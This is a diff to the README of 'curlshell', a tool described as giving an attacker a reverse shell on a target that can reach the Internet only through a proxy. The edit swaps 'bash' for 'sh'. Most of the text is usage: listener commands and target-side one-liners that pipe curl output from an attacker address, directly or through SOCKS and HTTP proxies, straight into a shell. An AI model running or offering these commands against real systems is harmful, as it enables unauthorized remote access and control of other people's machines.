@@ -4,7 +4,7 @@
 
 A reverse TCP shell through a proxy (using cURL).
 
-It allows an attacker to access a remote shell (bash) when the remote system can only access the Internet via a Proxy (and no other binaries can be installed or executed). It only needs `curl` and `bash`.
+It allows an attacker to access a remote shell (sh) when the remote system can access the Internet via a Proxy only (and no other binaries can be installed or executed). It only needs `curl` and `sh`.
 
 Generate a SSL Certificate:
 ```sh
@@ -19,7 +19,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3
 ```
 ```sh
 # On the target:
-curl -skfL https://1.2.3.4:8080 | bash
+curl -skfL https://1.2.3.4:8080 | sh
 ```
 
 ## With SOCKS Proxy
@@ -27,7 +27,7 @@ curl -skfL https://1.2.3.4:8080 | bash
 ./curlshell.py -x socks5h://5.5.5.5:1080 --certificate cert.pem --private-key key.pem --listen-port 8080 
 ```
 ```sh
-curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
+curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | sh
 ```
 
 ## With HTTP Proxy
@@ -35,7 +35,7 @@ curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
 ./curlshell.py -x http://5.5.5.5:3128 --certificate cert.pem --private-key key.pem --listen-port 8080 
 ```
 ```sh
-curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
+curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | sh
 ```
 
 ## With HTTP (plaintext)
@@ -43,7 +43,7 @@ curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
 ./curlshell.py --listen-port 8080
 ```
 ```sh
-curl -sfL http://1.2.3.4:8080 | bash
+curl -sfL http://1.2.3.4:8080 | sh
 ```
 
 # How it works
